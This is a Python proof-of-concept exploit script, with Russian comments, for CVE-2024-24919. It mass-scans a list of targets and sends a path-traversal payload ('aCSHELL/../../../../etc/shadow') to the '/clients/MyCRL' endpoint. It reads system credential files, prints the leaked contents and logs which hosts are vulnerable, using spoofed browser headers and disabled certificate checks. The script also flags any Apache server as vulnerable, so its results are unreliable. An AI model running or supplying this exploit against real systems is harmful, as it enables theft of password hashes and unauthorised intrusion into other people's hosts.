import argparse
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import logging

# Отключение предупреждений SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Настройка логгирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Ключевые слова, указывающие на уязвимость
vulnerable_markers = ['root:', 'nobody:', 'admin:', 'guest:']

# Сохраняет результат проверки в указанный файл.
def save_result_to_file(filename, content):
    with open(filename, 'a') as file:
        file.write(content + '\n')

# Выполнение POST-запроса на указанный URL и проверка ответа на наличие уязвимых маркеров.
def send_post_request(target_url, data_payload=None, custom_headers=None, output_file=None):
    try:
        response = requests.post(target_url, data=data_payload, headers=custom_headers, verify=False)
        if response.ok:
            # Проверка на наличие потенциально уязвимых строк в тексте ответа
            if analyze_response(response):
                output_content = f"[+] {target_url} is vulnerable"
                logger.info(output_content)
                display_response_info(data_payload, response.text)
                if output_file:
                    save_result_to_file(output_file, output_content)
            else:
                logger.info(f"[-] {target_url} не уязвим")
        else:
            logger.warning(f"[-] {target_url} вернул статус: {response.status_code}")
    except requests.RequestException as error:
        logger.error(f"Ошибка при запросе к {target_url}: {error}")

# Проверка текста и заголовков ответа на наличие признаков уязвимости.
def analyze_response(response):
    for marker in vulnerable_markers:
        if marker in response.text:
            return True
    if 'Apache' in response.headers.get('Server', ''):
        return True
    return False

# Отображение подробностей ответа в визуально структурированном формате.
def display_response_info(payload, response_content):
    if payload and payload.startswith("aCSHELL/../../../../../../../etc/shadow"):
        print("\n" + "="*60)
        print("{:^60}".format("!!! ОБНАРУЖЕН ФАЙЛ etc/shadow !!!"))
        print("="*60 + "\n")
        print("{:^60}".format(response_content))
        print("\n" + "="*60)
    else:
        print("\n" + "-"*60)
        print("{:^60}".format(">>> НАЙДЕН ФАЙЛ <<<"))
        print("-"*60 + "\n")
        print("{:^60}".format(response_content))
        print("\n" + "-"*60)

# Чтение списка URL-адресов из файла.
def read_urls_from_file(filepath):
    try:
        with open(filepath, 'r') as file:
            return [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        logger.error(f"Ошибка: Файл '{filepath}' не найден.")
        return []

def main():
    # Аргументы командной строки для передачи файла с URL и файла с пользовательским payload
    parser = argparse.ArgumentParser(description="CVE-2024-24919 PoC by geniuszly")
    parser.add_argument("-l", metavar='filename', type=str, help="Файл, содержащий список HTTP/HTTPS целей")
    parser.add_argument("-f", metavar='file', type=str, help="Файл для чтения пользовательского payload (может вызвать ошибки при использовании нескольких неизвестных целей)")
    parser.add_argument("-o", metavar='output', type=str, help="Файл для сохранения результатов проверки")
    args = parser.parse_args()

    # Заголовки запроса для эмуляции реального браузера
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Dnt": "1",
        "Sec-Gpc": "1",
        "Te": "trailers",
        "Connection": "close"
    }

    # Формирование основного payload
    base_payload = "aCSHELL/../../../../../../../{}"
    payload_to_use = base_payload.format(args.f) if args.f else "aCSHELL/../../../../../../../etc/shadow"

    # Проверка, был ли передан файл с целевыми URL
    if args.l:
        targets = read_urls_from_file(args.l)
        for target in targets:
            # Проверка корректности URL
            if target.startswith('http://') or target.startswith('https://'):
                send_post_request(target + '/clients/MyCRL', data_payload=payload_to_use, custom_headers=headers, output_file=args.o)
            else:
                logger.warning(f"Пропуск недействительного URL: {target}")
    else:
        logger.error("Пожалуйста, укажите файл с целями HTTP/HTTPS, используя параметр -l.")

if __name__ == "__main__":
    main()
